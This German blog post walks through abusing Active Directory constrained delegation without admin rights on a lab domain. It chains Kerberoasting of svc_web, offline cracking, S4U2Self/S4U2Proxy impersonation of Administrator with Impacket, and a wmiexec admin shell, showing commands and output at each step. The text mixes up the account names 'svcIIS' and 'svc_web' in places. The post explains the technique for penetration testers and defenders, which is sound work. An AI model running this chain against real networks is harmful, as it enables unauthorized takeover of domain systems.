---
date: '2026-06-07T12:00:38+06:00'
draft: false
title: 'Missbrauch der eingeschränkten Delegation ohne lokale Administratorrechte'
comments:
  enabled: true
  system: "giscus"
---

Es gibt ein hartnäckiges Missverständnis beim Penetration Testing von Active Directory: Viele glauben, dass man für einen Angriff auf die eingeschränkte Delegation (Constrained Delegation) zuerst einen Host kompromittieren, lokale Administratorrechte erlangen und Anmeldedaten aus dem Speicher auslesen muss.

Das Auslesen von LSASS ist zwar ein Standardweg, aber keineswegs eine zwingende Voraussetzung. Wenn es sich beim Ziel um ein Benutzerkonto mit einem schwachen Passwort handelt, kann ein normaler Domänenbenutzer einen vollständigen Delegationsangriff durchführen. Dadurch lässt sich eine Identitätsübernahme (Impersonation) des Domänen-Administrators komplett über das Netzwerk realisieren – ohne jemals die Festplatte eines Ziel-Endpunkts zu berühren oder erhöhte Berechtigungen zu benötigen.

Es folgt eine analytische Aufschlüsselung, wie die Kombination aus Kerberoasting und Protokollübergang (Protocol Transition) eine Domänenkompromittierung ohne Admin-Rechte ermöglicht. Der Fokus liegt dabei auf den zugrundeliegenden Mechanismen der Kerberos S4U-Erweiterungen.

## Phase 1: Identifizierung der Fehlkonfiguration (Zero-Touch-Enumeration)

Der Angriff beginnt aus der Perspektive eines standardmäßigen, unprivilegierten Domänenbenutzers. Das Ziel besteht darin, das Active Directory via LDAP nach Konten abzufragen, die für die eingeschränkte Delegation konfiguriert sind.

Hier ist die Standard-LDAP-Enumerationsausgabe über Impacket:

```bash
impacket-findDelegation 'corp.local/j.smith:Password!1' -dc-ip 192.168.100.10
```

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

AccountName  AccountType  DelegationType                      DelegationRightsTo             SPN Exists
-----------  -----------  ----------------------------------  -----------------------------  ----------
DC01$        Computer     Unconstrained                       N/A                            Yes
svc_web      Person       Constrained w/ Protocol Transition  WSMAN/APP01.corp.local        Yes
svc_web      Person       Constrained w/ Protocol Transition  WSMAN/APP01                   Yes
svc_web      Person       Constrained w/ Protocol Transition  HTTP/APP01.corp.local         No
svc_web      Person       Constrained w/ Protocol Transition  HTTP/APP01                    No
```

**Die Funktionsweise:**

Das entscheidende Element hierbei ist `Constrained w/ Protocol Transition`. Im Active Directory entspricht dies dem User Account Control-Flag `TRUSTED_TO_AUTH_FOR_DELEGATION` (T2A4D).

Wenn ein Dienstkonto dieses Flag besitzt, ist es ihm gestattet, die Kerberos-Erweiterung **S4U2Self** zu nutzen. Das bedeutet, dass das Konto `svc_web` ein Service-Ticket für sich selbst im Namen *jedes beliebigen* anderen Benutzers in der Domäne anfordern kann, ohne dass dieser Benutzer ein Passwort angeben muss. Die Spalte `DelegationRightsTo` bestimmt, wohin dieses Ticket anschließend weitergeleitet werden darf.

Da `svc_web` als `Person` (ein Benutzerkonto, kein Computerkonto) deklariert ist, ist es sehr wahrscheinlich, dass ihm ein Dienstprinzipalname (Service Principal Name, SPN) zugewiesen ist. Das macht es zu einem idealen Ziel für Offline-Angriffe.

## Phase 2: Die stille Extraktion (Kerberoasting)

Wäre `svcIIS` ein Computerkonto oder ein gruppenverwaltetes Dienstkonto (gMSA), wären lokale Administratorrechte erforderlich, um das rotierende, 120 Zeichen lange Passwort aus dem Speicher auszulesen. Da es sich jedoch um ein normales Benutzerkonto handelt, erlaubt es das Kerberos-Protokoll jedem authentifizierten Benutzer, ein TGS-Ticket (Ticket Granting Service) für dieses Konto anzufordern.

```bash
impacket-GetUserSPNs 'corp.local/j.smith:Password!1' \
-dc-ip 192.168.100.10 \
-request-user svc_web \
-outputfile svcweb_hash.txt

```

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName          Name      MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  --------  --------  --------------------------  --------------------------  -----------
HTTP/webapp.corp.local        svc_web             2025-01-10 09:15:22.000000  2026-06-06 02:39:59.678483 constrained
```

```bash
cat svcweb_hash.txt

```

```bash
$krb5tgs$23$*svc_web$CORP.LOCAL$corp.local/svc_web*$<REDACTED_TGS_HASH>

```

**Die Funktionsweise:**

Der Domänencontroller (Domain Controller, DC) gibt ein TGS-Ticket zurück, das mit dem RC4-HMAC-Hash des Passworts vom `svcIIS`-Konto verschlüsselt ist. Der Angreifer besitzt nun das kryptografische Material, das für eine Authentifizierung als `svc_web` benötigt wird. Indem dieser Hash offline genommen und gecrackt wird (was das Passwort `Password1@` offenbart), erlangt der Angreifer die vollständige Kontrolle über das Dienstkonto, ohne jemals Code auf dem eigentlichen IIS-Server ausgeführt zu haben.

## Phase 3: Fälschen des VIP-Tickets (S4U2Self & S4U2Proxy)

An diesem Punkt wird das Szenario der "Kompromittierung ohne Admin-Rechte" greifbar. Mit dem wiederhergestellten Klartext-Passwort leitet der Angreifer den NT-Hash ab (`43460d636f269c709b20049cee36ae7a`) und startet den Protokollmissbrauch.

```bash
impacket-getST corp.local/svc_web \
-hashes :43460d636f269c709b20049cee36ae7a \
-spn wsman/APP01.corp.local \
-impersonate Administrator \
-k

```

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@wsman_APP01.corp.local@CORP.LOCAL.ccache
```

**Die Funktionsweise:**

Dieser einzige Befehl führt den Kern des Angriffs auf die eingeschränkte Delegation vollständig über das Netzwerk aus:

1. **S4U2Self:** Der Angreifer authentifiziert sich als `svc_web` und fordert im Namen des `Administrator`-Kontos ein Ticket für sich selbst an. Da für `svc_web` der Protokollübergang (Protocol Transition) aktiviert ist, gibt der Domänencontroller nach und stellt ein weiterleitbares Ticket (forwardable ticket) aus.
2. **S4U2Proxy:** Der Angreifer nimmt dieses weiterleitbare Ticket sofort und legt es dem Domänencontroller erneut vor. Dabei fordert er Zugriff auf den nachgelagerten Dienst an, der in der LDAP-Enumeration definiert wurde (`wsman/APP01`).
3. **Das Ergebnis:** Der DC stellt ein gültiges Kerberos-Service-Ticket aus, das beweist, dass der Angreifer der Domänen-`Administrator` für diesen spezifischen Dienst ist.

Zu keinem Zeitpunkt musste das Passwort des `Administrator`-Kontos erraten werden, noch war eine Sitzung mit erhöhten Rechten erforderlich.

## Phase 4: Realistische Ausführung mit maximaler Auswirkung

Nachdem das gefälschte Ticket in den lokalen Anmeldedaten-Cache (Credential Cache) exportiert wurde, kann der Angreifer native Fernverwaltungsprotokolle wie WMI (Windows Management Instrumentation) oder WinRM nutzen, um mit dem Zielserver zu interagieren.

```bash
export KRB5CCNAME=Administrator@wsman_APP01.corp.local@CORP.LOCAL.ccache
```

```bash
impacket-wmiexec -k -no-pass \
corp.local/Administrator@APP01.corp.local
```

```bash
corp.local/Administrator@APP01.corp.local

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used

[!] Launching semi-interactive shell
[!] Press help for extra shell commands

C:\>whoami
corp\administrator

C:\>hostname
APP01

C:\>

```

**Die Auswirkung:**

Wenn man die Datenintegrität dieses Angriffspfads bewertet, wird die Tragweite schnell deutlich. Ein Angreifer mit geringen Berechtigungen hat eine standardmäßige Protokollfunktion ausgenutzt, um Sicherheitsgrenzen zu umgehen. Das Ergebnis ist eine interaktive Shell mit `Administrator`-Rechten auf einem sensiblen Server.

Sich auf die Annahme zu verlassen, dass Angreifer zuerst Endpunkte kompromittieren müssen, um die Delegation zu missbrauchen, schafft einen gefährlichen blinden Fleck. Solange der Protokollübergang mit leicht zu crackenden Passwörtern kombiniert wird, bleibt das Netzwerk anfällig für eine remote durchgeführte Domänenkompromittierung ohne Privilegien.